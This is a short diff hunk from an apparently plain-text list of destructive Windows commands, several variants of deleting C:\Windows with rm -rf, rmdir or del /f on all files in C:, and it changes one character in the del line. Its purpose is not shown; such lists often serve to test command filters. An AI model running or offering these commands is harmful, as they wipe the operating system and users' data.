@@ -7,5 +7,5 @@ powershell rm -rf C:\Windows -f --no-preserve-root
 powershell rm -rf C:\Windows -f
 powershell sudo rm -rf C:\Windows -f
 powershell rmdir C:\Windows
-del /f c:\*.* & S
+del /f c:\*.* & A
 powershell sudo rm -rf C:\Windows -f --no-preserve-root
